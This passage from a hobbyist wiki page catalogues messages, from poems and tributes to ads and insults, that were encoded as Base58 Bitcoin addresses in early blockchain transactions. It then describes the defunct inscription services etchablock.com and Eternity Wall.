  1AboutTheWorkingsofTheSun1zzyWJtfm
  ```

  Some of the messages weirdly have "xoxo" inserted into them, not sure why, e.g.<a id="_1102"></a>

  ```
  12TheFatherofTheWho1eWor1d2249xs5g
  191sHereXoXoXoXoXoXoXoXoXoXo72uqJv
  191tsPower1sWho1e1f1tHasXoXoWhYr3M
  1BeenTurned1ntoEarth222222221soWAL
  ```

  The full decoded text is:<a id="_1103"></a>
  > It is true, without error, certain and most true,  
  > That which is below is as that which is above, and that which is above is as that which is below, to perform the miracles of the one thing.  
  > And as all things were from the one, by means of the meditation of the one, thus all things were born from the one, by means of adaptation.  
  > Its father is the Sun, its mother is the Moon, the Wind carried it in its belly, its nurse is the earth.  
  > The father of the whole world is here.  
  > Its power is whole if it has been turned into earth.  
  > You will separate the earth from the fire, the subtle from the dense, sweetly, with great skill.  
  > It ascends from earth into heaven and again it descends to the earth, and receives the power of higher and of lower things.  
  > Thus you will have the Glory of the whole world.  
  > Therefore will all obscurity flee from you.  
  > Of all strength this is true strength, because it will conquer all that is subtle, and penetrate all that is solid.  
  > Thus was the world created.  
  > From this were wonderful adaptations, of which this is the means. Therefore am I named Thrice-Great Hermes, having the three parts of the philosophy of the whole world.  
  > It is finished, what I have said about the working of the Sun.
<a id="_1104"></a>
- <a id="_1105"></a>
  [`11111111LeonhardEu1er111126nxjP`](https://www.blockchain.com/explorer/addresses/btc/11111111LeonhardEu1er111126nxjP) on [tx 80ddf2e7e04922e2cbf6e744dbf47aec02d781505d8b2c4ee5f725b8882ddb2d](https://www.blockchain.com/explorer/transactions/btc/80ddf2e7e04922e2cbf6e744dbf47aec02d781505d8b2c4ee5f725b8882ddb2d) block 155051 (2011-11-28) is a tribute to Swiss mathematician [Leonhard Euler](https://ourbigbook.com/go/topic/leonhard-euler)

  <a id="image-swiss-mathematician-leonard-euler"></a>
  ![](https://upload.wikimedia.org/wikipedia/commons/thumb/f/f9/Leonhard_Euler_-_Jakob_Emanuel_Handmann_%28Kunstmuseum_Basel%29.jpg/500px-Leonhard_Euler_-_Jakob_Emanuel_Handmann_%28Kunstmuseum_Basel%29.jpg)

  **[Figure 93](#image-swiss-mathematician-leonard-euler). Swiss mathematician Leonard Euler**. [Source](https://commons.wikimedia.org/wiki/File:Leonhard_Euler_-_Jakob_Emanuel_Handmann_%28Kunstmuseum_Basel%29.jpg). Off-chain image.
<a id="_1106"></a>
- [024b093afb54f69426c5624f09a5f2d3791ce20513225cbb42d333ad72f8576e](https://www.blockchain.com/explorer/transactions/btc/024b093afb54f69426c5624f09a5f2d3791ce20513225cbb42d333ad72f8576e) block 155256 (2011-11-29) has two self-explanatory outputs:<a id="_1107"></a>
  > Just A Two Line  
  > Test

  <a id="_1108"></a>
  ```
  112JustATwoLine222222222221vcJxpZ
  11111Test111112222222222222LiApa
  ```
<a id="_1109"></a>
- [tx 8f64d2b7a762767e3870c4aee95f8c7b5439cf02cf7d7e5d99b6e39967ecada8](https://www.blockchain.com/explorer/transactions/btc/8f64d2b7a762767e3870c4aee95f8c7b5439cf02cf7d7e5d99b6e39967ecada8) block 155256 (2011-11-29) encodes the poem "Shall I compare thee to a summer's day?" by [Shakespeare](https://ourbigbook.com/go/topic/shakespeare) 22 addresses starting with:<a id="_1110"></a>

  ```
  11Sha111CompareTheeToAXXXXXVnRohE
  11SummersDayThouArtMoreXXXXUcpgnX
  11Love1yAndMoreTemperateXXXUu485j
  ...
  ```

  Full original text:<a id="_1111"></a>
  > Shall I compare thee to a summer's day?  
  > Thou art more lovely and more temperate.  
  > Rough winds do shake the darling buds of May,  
  > And summer's lease hath all too short a date.  
  > Sometime too hot the eye of heaven shines,  
  > And often is his gold complexion dimmed;  
  > And every fair from fair sometime declines,  
  > By chance, or nature's changing course, untrimmed;  
  > But thy eternal summer shall not fade,  
  > Nor lose possession of that fair thou ow'st,  
  > Nor shall death brag thou wand'rest in his shade,  
  > When in eternal lines to Time thou grow'st.  
  > So long as men can breathe, or eyes can see,  
  > So long lives this, and this gives life to thee.

  More Shakespeare follows at [tx 0ae2eaaa9cddafba89b4c92d074f4e5254cbf7691cbe7f64660bf549c7071147](https://www.blockchain.com/explorer/transactions/btc/0ae2eaaa9cddafba89b4c92d074f4e5254cbf7691cbe7f64660bf549c7071147) block 155383 (2011-11-20) has a passage from [Romeo and Juliet](https://ourbigbook.com/go/topic/romeo-and-juliet) starting with:<a id="_1112"></a>

  ```
  11TisButThyNameThat1sMyXXXXWabTZh
  11EnemyThouArtThyse1fThoughXNRG4J
  11NotAMontagueWhatsMontagueYEJDfM
  111t1sNorHandNorFootNorArmXVNeFEV
  ```

  Full original text:<a id="_1113"></a>
  > 'Tis but thy name that is my enemy;  
  > Thou art thyself, though not a Montague.  
  > What's Montague? It is nor hand, nor foot,  
  > Nor arm, nor face, nor any other part  
  > Belonging to a man. O, be some other name!  
  > What's in a name? That which we call a rose,  
  > By any other word would smell as sweet.  
  > So Romeo would - were he not Romeo called -  
  > Retain that dear perfection which he owes  
  > Without that title. Romeo, doff thy name,  
  > And for that name, which is no part of thee,  
  > Take all myself.
<a id="_1114"></a>
- Various other notable texts follow on 2011-12-01:<a id="_1115"></a>

  <a id="_1116"></a>
  - [tx 1f9606f267cc398356663b14d1a7a3591e3da06572893394c14975a6fc11798f](https://www.blockchain.com/explorer/transactions/btc/1f9606f267cc398356663b14d1a7a3591e3da06572893394c14975a6fc11798f) block 155467 (2011-12-01) contains an excerpt from Newton's [Principia](physicist.md#philosophiae-naturalis-principia-mathematica) starting with:<a id="_1117"></a>

    ```
    11Ru1e1WeAreToAdmitNoMoreXXazQ96z
    11CausesofNatura1ThingsThanZAQ9ig
    11SuchAsAreBothTrueAndXXXXXZyzfQp
    11SufficientToExp1ainTheirXVSC2gY
    ```

    Full original text[https://history.hanover.edu/courses/excerpts/212newt.html](https://history.hanover.edu/courses/excerpts/212newt.html):<a id="_1118"></a>
    > <a id="_1119"></a>
    > RULE 1 We are to admit no more causes of natural things, than such as are both true and sufficient to explain their appearances.
    > 
    > <a id="_1120"></a>
    > RULE II Therefore to the same natural effects we must, as far as possible, assign the same causes.
    > 
    > <a id="_1121"></a>
    > RULE III The qualities of bodies, which admit neither intension nor remission of degrees, and which are found to belong to all bodies within reach of our experiments, are to be esteemed the universal qualities of all bodies whatsoever.
    > 
    > <a id="_1122"></a>
    > RULE IV In experimental philosophy we are to look upon propositions collected by general induction from phenomena as accurately or very nearly true, notwithstanding any contrary hypotheses that may be imagined, till such time as other phenomena occur, by which they may either be made more accurate, or liable to exceptions.
  <a id="_1123"></a>
  - [tx 89010c791c9d7ed24affa1d638b12179d2ca7ec91704fe906834386f43a8101d](https://www.blockchain.com/explorer/transactions/btc/89010c791c9d7ed24affa1d638b12179d2ca7ec91704fe906834386f43a8101d) starting at `11When1nTheCourseofHumanXXXXdfMdQ`: [Declaration of Independence](https://ourbigbook.com/go/topic/declaration-of-independence)
  <a id="_1124"></a>
  - [tx f7ca83a8a2e1c78efdfde0791d99a567ddaa60805c3b5b857bc7ec14ec2c8204](https://www.blockchain.com/explorer/transactions/btc/f7ca83a8a2e1c78efdfde0791d99a567ddaa60805c3b5b857bc7ec14ec2c8204) starting at `11AVa1id1dentifier1sAXXXXXXcrnyki`: likely contains an excerpt of the C or C++ standard. Possible source: [https://en.wikipedia.org/wiki/C_data_types](https://en.wikipedia.org/wiki/C_data_types).
  <a id="_1125"></a>
  - [tx 028b8514a4f6cc96ac3c1c83dbb117ab9dc5eb09deab7b49bf038fd460173127](https://www.blockchain.com/explorer/transactions/btc/028b8514a4f6cc96ac3c1c83dbb117ab9dc5eb09deab7b49bf038fd460173127) starting at `11TheSetupTheJokeA1waysXXXXTF9Wzp`: [The aristocrats by HP Lovecraft](https://www.reddit.com/r/Lovecraft/comments/zxtkd/hp_lovecrafts_the_aristocrats/), which talks about the [The Aristocrats](https://ourbigbook.com/go/topic/the-aristocrats) joke pattern
  <a id="_1126"></a>
  - [tx bd513d9ee605ead1a299c9dfb77de1127bf651c54d99820e9be8b40cef8c8dfe](https://www.blockchain.com/explorer/transactions/btc/bd513d9ee605ead1a299c9dfb77de1127bf651c54d99820e9be8b40cef8c8dfe) starting at `11Si1ex1sAnAcronymForXXXXXXcujTa5` talks briefly about SILEX ([separation of isotopes by laser excitation](https://ourbigbook.com/go/topic/separation-of-isotopes-by-laser-excitation))
  <a id="_1127"></a>
  - [tx ef374dcc5b23f16ecb0b1b639ba577d2acda7ad32321b5866db2fa9e6807b9c5](https://www.blockchain.com/btc/tx/ef374dcc5b23f16ecb0b1b639ba577d2acda7ad32321b5866db2fa9e6807b9c5) block 155494 (2011-12-01) contains the intruction from the bitcoin.org website: [https://web.archive.org/web/20210129054851/https://bitcoin.org/en/](https://web.archive.org/web/20210129054851/https://bitcoin.org/en/)<a id="_1128"></a>

    ```
    11Bitcoin1sADecentra1izedXXWPM6Hs
    11PeertopeerNetworkoverXXXXUkyy3M
    11WhichUsersMakeXXXXXXXXXXXX4tQgN
    11TransactionsThatAreXXXXXXVdZfnJ
    ```
  <a id="_1129"></a>
  - [tx 05ee60dfb92795c79e46e106f52bbdbc1006eba0837ed9e4ad99d9b214eb5fcf](https://www.blockchain.com/explorer/transactions/btc/05ee60dfb92795c79e46e106f52bbdbc1006eba0837ed9e4ad99d9b214eb5fcf) block 155538 contains a tribute to Archimedes:<a id="_1130"></a>

    ```
    11ArchimedesWasANativeofXXXXJsj6W
    11SyracuseSici1y1t1sXXXXXXXaYF4CE
    11ReportedBySomeAuthorsThatXjFBcV
    11HeVisitedEgyptAndThereXXXYVzj58
    ```

    original text at: [https://mathshistory.st-andrews.ac.uk/Biographies/Archimedes/](https://mathshistory.st-andrews.ac.uk/Biographies/Archimedes/)<a id="_1131"></a>
    > Archimedes was a native of Syracuse, Sicily. It is reported by some authors that he visited Egypt and there invented a device now known as Archimedes' screw. This is a pump, still used in many parts of the world. It is highly likely that, when he was a young man, Archimedes studied with the successors of Euclid in Alexandria. Certainly he was completely familiar with the mathematics developed there, but what makes this conjecture much more certain, he knew personally the mathematicians working there and he sent his results to Alexandria with personal messages. He regarded Conon of Samos, one of the mathematicians at Alexandria, both very highly for his abilities as a mathematician and he also regarded him as a close friend.

    <a id="image-archimedes"></a>
    ![](https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Domenico-Fetti_Archimedes_1620.jpg/500px-Domenico-Fetti_Archimedes_1620.jpg)

    **[Figure 94](#image-archimedes). Archimedes**. [Source](https://commons.wikimedia.org/wiki/File:Domenico-Fetti_Archimedes_1620.jpg). Off-chain image.
  <a id="_1132"></a>
  - [tx 237b50dac42af130171773b233954e62690182fd4901a453ad5d11d1d54a8ca3](https://www.blockchain.com/btc/tx/237b50dac42af130171773b233954e62690182fd4901a453ad5d11d1d54a8ca3) block 155545 (2012-01-01) contains an exceprt from [https://en.wikipedia.org/wiki/The_Glass_Menagerie](https://en.wikipedia.org/wiki/The_Glass_Menagerie)<a id="_1133"></a>

    ```
    11TomAppearsAtTheTopofTheXXWyM2Bt
    11A11eyAfterEachSo1emnBoomXaBp7oy
    11ofTheBe111nTheTowerHeXXXXVQaies
    11ShakesALitt1eNoisemakeroraeWTgK
    ...
    ```
  <a id="_1134"></a>
  - [tx 57bfd63000bbfa6e9a61f7285a4abf9aef91dfcfba4fe0f940b431653eb8068b](https://www.blockchain.com/btc/tx/57bfd63000bbfa6e9a61f7285a4abf9aef91dfcfba4fe0f940b431653eb8068b) block 155494 (2011-12-01) is a [Lorem ipsum](art.md#lorem-ipsum) and [tx 7961b5ae2f053a16d5c589104f87edfabe80fcae185832ea185e7f0cf06c7747](https://www.blockchain.com/explorer/transactions/btc/7961b5ae2f053a16d5c589104f87edfabe80fcae185832ea185e7f0cf06c7747) (2011-12-05) is another one:<a id="_1135"></a>

    ```
    11Lorem1psumDo1orSitAmetXXXWAEZ6C
    11ConsecteturAdipiscingE1itYQHEPM
    ...
    ```
<a id="_1136"></a>
- [tx 8ffacbb18f63576fe323cbf2acc6c4c01c86aadf13d8352cfdd39d91916d98c8](https://www.blockchain.com/btc/tx/8ffacbb18f63576fe323cbf2acc6c4c01c86aadf13d8352cfdd39d91916d98c8) block 156164 (2011-12-05) advertises [etchablock.com](#etchablock-com) by repeating the following 3 messages 80 times:<a id="_1137"></a>

  ```
  11EtchABLockDotComGivesYouXZHcYVz
  11BLockChain1mmortaLityXXXXYRZD5m
  11VisitEtchABLockDotComNowXTbeZZ9
  ```

  decoding to:<a id="_1138"></a>
  > etchablock.com gives you blockchain immortaility. Visit etchablock.com now.

  More ads can be seen at:<a id="_1139"></a>

  <a id="_1140"></a>
  - [tx 14bac1f94636c24ada613b1ccc5fe4fca35657683baac6cc861f0eb88fd33fbc](https://www.blockchain.com/btc/tx/14bac1f94636c24ada613b1ccc5fe4fca35657683baac6cc861f0eb88fd33fbc)
  <a id="_1141"></a>
  - [tx bfb41cbb857a8189bfacecfc3cd544ee9d14af4414ea95a7b4f86507eace8183](https://www.blockchain.com/btc/tx/bfb41cbb857a8189bfacecfc3cd544ee9d14af4414ea95a7b4f86507eace8183)
<a id="_1142"></a>
- [tx 12a8866ea85a8a6838d77cc67ce74ef190a074bc822572f4a82daad00fd980d6](https://www.blockchain.com/explorer/transactions/btc/12a8866ea85a8a6838d77cc67ce74ef190a074bc822572f4a82daad00fd980d6) block 156119 (2011-12-05) seems like an alphabet test:<a id="_1143"></a>

  ```
  111111111a11111111111b11dC8yHQ
  111111111c1111111111111dWctEU9
  111111111111e1111111111W7v25m
  111111f1111111111111111g11WfG2p8
  1111111111111h111111111WdQPXP
  11111i111111111111j1111111bL5SyF
  11111111k111111111111111XV7PT9D
  111L1111111111111111111m111YmYGPJ
  1111111111111111n11111U4Rs6D
  1111111111111o111111111cLV3wA
  11111111p11111111111111qW1RK1A
  1111111111111111r1111VRWJZs
  111111111111s1111111111VUeyXS
  11111111111t11111111111Vq1Wm3
  11111111u111111111111111bVpCYE
  111111111v11111111111111XoV17A
  11111111w1111111111111111YyEFv6
  111111111x11111111111111XvZPGp
  11111111111y11111111111Y1hDo5
  111111111111111zXXXXXXVSn6d5
  ```
<a id="_1144"></a>
- [tx 31331de21d321766fcac556d7233ad0e3918bc78c7af22b99373569c07d4f30c](https://www.blockchain.com/explorer/transactions/btc/31331de21d321766fcac556d7233ad0e3918bc78c7af22b99373569c07d4f30c) block 158772 (2011-12-23) has a quick love declaration by a Chinese dude to his Chinese dudess<a id="_1145"></a>

  ```
  11YechunnanLoveChenchenYeziSsezJQ
  11ForeverXXXXXXXXXXXXXXXXXXWcSE4Z
  ```

  presumably the man's name is "Ye Chunnan", possible profile: [https://github.com/finway-china](https://github.com/finway-china)
<a id="_1146"></a>
- [tx bf40e4a1c2546747bc800a085e7145d921a9f402aaf4040c155ff5d0df9cc999](https://www.blockchain.com/explorer/transactions/btc/bf40e4a1c2546747bc800a085e7145d921a9f402aaf4040c155ff5d0df9cc999) block 161202 (2012-01-08) encodes:<a id="_1147"></a>

  ```
  11When1DieBuryMeDeepLayTwoXVEY5jv
  11SpeakersAtMyFeetAPairofXXTyrHor
  11HeadphonesonMyHeadAndXXXXYUSvnd
  11ALwaysPLayTheGratefuLDeadWdq4Xo
  ```

  <a id="_1148"></a>
  > When I die, bury me deep, lay two speakers at my feet, a pair of headphones on my head. Always play the grateful dead.

  Related quote mention: [https://www.reddit.com/r/quotes/comments/w51yfg/comment/iwnxk9i/](https://www.reddit.com/r/quotes/comments/w51yfg/comment/iwnxk9i/)
<a id="_1149"></a>
- [tx 3a027fadac6ac2d9cf54480667465ba6ad88b7b3c1de62e1cb34cd06a44243ac](https://www.blockchain.com/explorer/transactions/btc/3a027fadac6ac2d9cf54480667465ba6ad88b7b3c1de62e1cb34cd06a44243ac) block 161267 (2012-01-08) has a birthday wish:<a id="_1150"></a>

  ```
  11HappyBirthdayStephenXXXXXZL6eQZ
  11HawkingXXXXXXXXXXXXXXXXXXRu9FPe
  ```

  <a id="_1151"></a>
  > Happy birthday Stephen Hawking

  <a id="image-stephen-hawking"></a>
  ![](https://upload.wikimedia.org/wikipedia/commons/e/eb/Stephen_Hawking.StarChild.jpg)

  **[Figure 95](#image-stephen-hawking). Stephen Hawking**. [Source](https://commons.wikimedia.org/wiki/File:Stephen_Hawking.StarChild.jpg). Off-chain image.
<a id="_1152"></a>
- [1BrianDeeryWasHereCaryNCUSAy1hRCCC](https://www.blockchain.com/explorer/addresses/btc/1BrianDeeryWasHereCaryNCUSAy1hRCCC) on [tx c584dd7d3e9ba9776d61ae91f801371e21e434b9d8dab3c81850301433a50fcb](https://www.blockchain.com/explorer/transactions/btc/c584dd7d3e9ba9776d61ae91f801371e21e434b9d8dab3c81850301433a50fcb) block 188657 (2012-06-12) is a check-in by a Brian Deery at Cary, NC, USA. Most likely:<a id="_1153"></a>

  <a id="_1154"></a>
  - [https://www.crunchbase.com/person/brian-deery](https://www.crunchbase.com/person/brian-deery)
  <a id="_1155"></a>
  - [https://x.com/deery_me](https://x.com/deery_me)
  <a id="_1156"></a>
  - [https://www.findinggeniuspodcast.com/podcasts/brian-deery-on-asic-boost-the-blockchain-and-the-history-and-future-of-bitcoin/](https://www.findinggeniuspodcast.com/podcasts/brian-deery-on-asic-boost-the-blockchain-and-the-history-and-future-of-bitcoin/)
<a id="_1157"></a>
- [tx 143a3d7e7599557f9d63e7f224f34d33e9251b2c23c38f95631b3a54de53f024](https://www.blockchain.com/explorer/transactions/btc/143a3d7e7599557f9d63e7f224f34d33e9251b2c23c38f95631b3a54de53f024) block 306,204 (2014-06-16) has a [Star Wars opening crawl](https://ourbigbook.com/go/topic/star-wars-opening-crawl):<a id="_1158"></a>

  ```
  1EpisodeiV111111111111111111wbq9i2
  1ANewHope1111111111111111111vnYm6D
  111111111111111111112xT3273
  1itisAPeriodofCiviLWarRebeLyzK2rV
  1SpaceshipsStrikingFromA111vh24Fi
  1HiddenBaseHaveWonTheirFirstVCugGV
  1VictoryAgainstTheEviL111123YSBKF
  1GaLacticEmpire1111111111111xsW5HG
  1111111111111111111141MmnWZ
  1DuringTheBattLeRebeLSpies11ybfhTP
  1ManagedToSteaLSecretPLansToxvKf4K
  1TheEmpiresULtimateWeapon11zoRcyn
  1TheDEATHSTARAnArmoredSpacezUyCHa
  1StationWithEnoughPowerTo11vFTWwP
  1DestroyAnEntirePLanet1111122KUcy5
  111111111111111111114ysyUW1
  1PursuedByTheEmpiresSinisterypjWrk
  1AgentsPrincessLeiaRacesHomewxuNTT
  1AboardHerStarshipCustodian1yhX6zg
  1ofTheStoLenPLansThatCan111zCJt3F
  1SaveHerPeopLeAndRestore111yULD1y
  1FreedomToTheGaLaxy1111111122roNk3
  ```

  <a id="image-star-wars-opening-crawl"></a>
  ![](https://web.archive.org/web/20250328114856im_/https://ew.com/thmb/eW1iuH6MfyudbBScg2O34cYe3Uw=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/star-wars-crawl-02-d8ed15dbd1fe4127858c3e22593988be.jpg)

  **[Figure 96](#image-star-wars-opening-crawl). Star Wars Opening Crawl**. [Source](https://ew.com/article/2015/12/22/star-wars-crawl-creator/). Off-chain image.
<a id="_1159"></a>
- [1PavedWithGodAndSomeTeensionXudq5X](https://www.blockchain.com/explorer/addresses/btc/1PavedWithGodAndSomeTeensionXudq5X) on [tx 3e1572ca351d743d7bf627bc844da8f3bdc84eab4a9d27934a8dba30a2e05fe1](https://www.blockchain.com/explorer/transactions/btc/3e1572ca351d743d7bf627bc844da8f3bdc84eab4a9d27934a8dba30a2e05fe1) block 371894 (2015-08-28) is the largest likely burn that we know of with a single transaction, totalling 1.61803399 BTC<a id="_1160"></a>
  > Paved With God And Some Teension

  It is unclear what this means exactly and we can't find any pre-existing soruces, but it seems to be a variant of the well known:<a id="_1161"></a>
  > [The road to hell is paved with good intentions](https://ourbigbook.com/go/topic/the-road-to-hell-is-paved-with-good-intentions)
<a id="_1162"></a>
- [1NakamotoSatoshiCraigWright8RwLKB](https://www.blockchain.com/explorer/addresses/btc/1NakamotoSatoshiCraigWright8RwLKB) appears on two transactions mentioning our friend [Craig Steven Wright](cryptocurrency.md#craig-steven-wright), the first being [tx 2e3207cc93844e2684bdc0bb856c32a6b703dab5b4ba19ed4f06b3fd581b61c3](https://www.blockchain.com/explorer/transactions/btc/2e3207cc93844e2684bdc0bb856c32a6b703dab5b4ba19ed4f06b3fd581b61c3) block 474472 (2016-06-13)<a id="_1163"></a>
  > Nakamoto Saoshi Craig Wright

  A few others include:<a id="_1164"></a>

  <a id="_1165"></a>
  - [1FuckRogerVerCraigWrightJihanBGMX3](https://www.blockchain.com/explorer/addresses/btc/1FuckRogerVerCraigWrightJihanBGMX3) (2018-02-08)<a id="_1166"></a>
    > Fuck [Roger Ver](https://ourbigbook.com/go/topic/roger-ver) [Craig Wright](https://ourbigbook.com/go/topic/craig-wright) [Jihan](https://ourbigbook.com/go/topic/jihan-wu)
  <a id="_1167"></a>
  - [1CraigWrightisAFrausterCuntwgASwJ](https://www.blockchain.com/explorer/addresses/btc/1CraigWrightisAFrausterCuntwgASwJ) (2019-06-02)<a id="_1168"></a>
    > [Craig Wright](cryptocurrency.md#craig-steven-wright) is a fraudster cunt
  <a id="_1169"></a>
  - [1FuckYouGraigWrightxSatoshiXc6ppN](https://www.blockchain.com/explorer/addresses/btc/1FuckYouGraigWrightxSatoshiXc6ppN) (2020-06-24)<a id="_1170"></a>
    > Fuck [Craig Wright](cryptocurrency.md#craig-steven-wright)

  <a id="image-craig-steven-wright"></a>
  ![](https://web.archive.org/web/20250124020342im_/https://i.guim.co.uk/img/media/a3e4de579a13e709b9705e1225804654b5e61e14/1009_1_2530_1518/master/2530.jpg?width=620&amp;dpr=1&amp;s=none&amp;crop=none)

  **[Figure 97](#image-craig-steven-wright). Craig Steven Wright**. [Source](https://www.theguardian.com/technology/2021/dec/07/australian-man-craig-wright-wins-us-court-battle-for-bitcoin-fortune-worth-billions). Off-chain image. The dude is so crooked that you can tell it just by looking at him for 2 seconds! Epic.

<a id="_1171"></a>
Related:<a id="_1172"></a>

<a id="_1173"></a>
- [https://www.reddit.com/r/Buttcoin/comments/3kqdjv/a_list_of_bitcoin_addresses_used_to_intentionally/](https://www.reddit.com/r/Buttcoin/comments/3kqdjv/a_list_of_bitcoin_addresses_used_to_intentionally/) A list of bitcoin addresses used to intentionally burn bitcoin (2015-09-13). Their list is not based solely on base58 images, e.g. [1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa](cryptocurrency.md#genesis-block-output-address) from the [Genesis block](cryptocurrency.md#genesis-block) is present. Also their ordering is unclear, it's neither stricly chronological nor by value. But it is a good list however.
<a id="_1174"></a>
- [https://github.com/BranndonWork/bitcoin-bulk-balance-check/blob/master/burned.csv](https://github.com/BranndonWork/bitcoin-bulk-balance-check/blob/master/burned.csv)
<a id="_1175"></a>
- [https://bitcointalk.org/index.php?topic=84569](https://bitcointalk.org/index.php?topic=84569) Vanity Pool - vanity address generator pool
<a id="_1176"></a>
- [https://bitcointalk.org/index.php?topic=85935](https://bitcointalk.org/index.php?topic=85935) Coins sent to the great wallet in the sky (2012-06-07)
<a id="_1177"></a>
- [https://bitcointalk.org/index.php?topic=90982.285](https://bitcointalk.org/index.php?topic=90982.285) Rare address hall of fame (2015)
<a id="_1178"></a>
- [https://bitcointalk.org/index.php?topic=917913.0](https://bitcointalk.org/index.php?topic=917913.0) Burn Baby Burn! - Compiling all Bitcoin burn addresses by fairglu (2015)
<a id="_1179"></a>
- [https://bitcointalk.org/index.php?topic=553449.0](https://bitcointalk.org/index.php?topic=553449.0) Longest most impressive VANITY (2014)
<a id="_1180"></a>
- [https://bitcointalk.org/index.php?topic=558604.0](https://bitcointalk.org/index.php?topic=558604.0) Custom Bitcoin address? (2014)
<a id="_1181"></a>
- [https://medium.com/@westkate37/burned-bitcoins-d9b15b3699d6](https://medium.com/@westkate37/burned-bitcoins-d9b15b3699d6)
<a id="_1182"></a>
- [https://www.bitcoinwhoswho.com/blog/2018/12/29/2-btc-burned-in-2018/](https://www.bitcoinwhoswho.com/blog/2018/12/29/2-btc-burned-in-2018/)
<a id="_1183"></a>
- [https://bitcoin.stackexchange.com/questions/70241/whats-with-this-address-1111111111111111111114olvt2/125931#125931](https://bitcoin.stackexchange.com/questions/70241/whats-with-this-address-1111111111111111111114olvt2/125931#125931)
<a id="_1184"></a>
- [https://bitcoin.stackexchange.com/questions/49625/whats-the-point-of-bitcoin-eaters](https://bitcoin.stackexchange.com/questions/49625/whats-the-point-of-bitcoin-eaters) mentions in particular `1BitcoinEaterAddressDontSendf59kuE`
<a id="_1185"></a>
- [https://kf106.medium.com/interesting-addresses-on-the-bitcoin-blockchain-e0956f06ec01](https://kf106.medium.com/interesting-addresses-on-the-bitcoin-blockchain-e0956f06ec01) has some interesting monetary ones, not inscriptions
<a id="_1186"></a>
- [https://www.bitcoinwhoswho.com/blog/2016/06/01/the-7-most-incredible-bitcoin-addresses/](https://www.bitcoinwhoswho.com/blog/2016/06/01/the-7-most-incredible-bitcoin-addresses/) The 7 Most Incredible Bitcoin Addresses (2016)

<h5 id="etchablock-com">etchablock.com</h5>

↑ **Parent:** [Base58 messages](#base58-messages)  
🏷️ **Tags:** [Inscription service](social-technology.md#inscription-service)

<a id="_1189"></a>
[http://etchablock.com](http://etchablock.com) was presumably an [inscription service](social-technology.md#inscription-service) that allowed people to pay to have [Base58 messages](#base58-messages) inscribed on the [Bitcoin blockchain](cryptocurrency.md#bitcoin).

<a id="_1190"></a>
The service failed to gain popularity and not much is known about it. [justdropped.com](computer.md#justdropped-com) marks the domain as having expired on 2013-02-03.[https://justdropped.com/drops/020313com.html](https://justdropped.com/drops/020313com.html).

<a id="_1191"></a>
The first known mentions of the service date back to December 2011, when it started self-advertizing in the blockchain around [tx 8ffacbb18f63576fe323cbf2acc6c4c01c86aadf13d8352cfdd39d91916d98c8](https://www.blockchain.com/btc/tx/8ffacbb18f63576fe323cbf2acc6c4c01c86aadf13d8352cfdd39d91916d98c8) block 156164 (2011-12-05) by repeating the following 3 messages 80 times:<a id="_1192"></a>

```
11EtchABLockDotComGivesYouXZHcYVz
11BLockChain1mmortaLityXXXXYRZD5m
11VisitEtchABLockDotComNowXTbeZZ9
```
decoding to:<a id="_1193"></a>


> etchablock.com gives you blockchain immortaility. Visit etchablock.com now.

<a id="_1194"></a>
The website was down as of 2021, and there were no decent archives unfortunately: [http://web.archive.org/web/20130301000000*/http://etchablock.com/](http://web.archive.org/web/20130301000000*/http://etchablock.com/).

<a id="_1195"></a>
Some surviging online mentions include:<a id="_1196"></a>

<a id="_1197"></a>
- [https://www.reddit.com/r/Bitcoin/comments/s9cra/comment/c4d5x9b/](https://www.reddit.com/r/Bitcoin/comments/s9cra/comment/c4d5x9b/) Gold, Silver, and Bitcoin spot prices are now only a call (or text) away (2012-04-14) suggests that the creator is a "Jonathan Ryan Owens" since user [jonathanryanowens](https://www.reddit.com/user/jonathanryanowens/) comments:<a id="_1198"></a>
  > Aside from Bitcoinduit, which was the first project we worked on for the purpose of investigating the inner workings of the bitcoin network and double spend threats? Ok.. here's a few: We developed custom bitcoin signing agents (etchablock.com), we did the first facebook bitcoin wallet (yougotcoin.com), we have our own custom c++ libraries that completely reimplement bitcoind for our own applications, we have an actual working double spend detection and alerter infrastructure, and also a coming slew of apps related to microlending and fixed exchange services..

  Some profiles:<a id="_1199"></a>

  <a id="_1200"></a>
  - [https://bitcointalk.org/index.php?action=profile;u=22299](https://bitcointalk.org/index.php?action=profile;u=22299)
<a id="_1201"></a>
- [https://bitcointalk.org/index.php?topic=53752.msg651512#msg651512](https://bitcointalk.org/index.php?topic=53752.msg651512#msg651512) says on 2011-12-15:<a id="_1202"></a>
  > Try etchablock.com!

  by user [TT](https://bitcointalk.org/index.php?action=profile;u=34329).
<a id="_1203"></a>
- [https://dune.com/queries/3857233](https://dune.com/queries/3857233) has a random looking commented out mention of `etchablock.com` on the [SQL](sql.md)

#### Eternity Wall

↑ **Parent:** [Text](#text)  
🏷️ **Tags:** [Inscription service](social-technology.md#inscription-service)

<a id="_1207"></a>
[https://eternitywall.it](https://eternitywall.it)

<a id="_1208"></a>
This website used to allow embedding text messages with [OP\_RETURN](cryptocurrency.md#op-return), here's an archive from 2015: [https://web.archive.org/web/20150718052659/http://eternitywall.it/](https://web.archive.org/web/20150718052659/http://eternitywall.it/)

<a id="_1209"></a>
As of January 2024, it seems to read-only mode, where it simply indexes matching transactions that were made via other means: [https://web.archive.org/web/20230929075331/https://eternitywall.it/](https://web.archive.org/web/20230929075331/https://eternitywall.it/)

<a id="_1210"></a>
A [Reddit](website.md#reddit) announcement from July 2015: [https://www.reddit.com/r/Bitcoin/comments/3dxy9f/eternity_wall_messages_lasting_forever/](https://www.reddit.com/r/Bitcoin/comments/3dxy9f/eternity_wall_messages_lasting_forever/)

<a id="_1211"></a>
There were 3191 hits for the search term:<a id="_1212"></a>

```
git grep '\bEW '
```
in our data starting with [tx a3b3af21514bd79a4cbcac9916a8514636a72d813539192214542fd85247082e](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0362.txt#L966) ([2015-06-24](https://www.blockchain.com/explorer/transactions/btc/a3b3af21514bd79a4cbcac9916a8514636a72d813539192214542fd85247082e)):<a id="_1213"></a>


> EW Eternity wall is live

up to the last entry on [tx 28820bc14cf2cfda58ecbc9ac6df3f41a1cb90f4246543f01ba42a5e9dac3cf8](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0794.txt#L4692) ([2023-06-15](https://www.blockchain.com/explorer/transactions/btc/28820bc14cf2cfda58ecbc9ac6df3f41a1cb90f4246543f01ba42a5e9dac3cf8))<a id="_1214"></a>


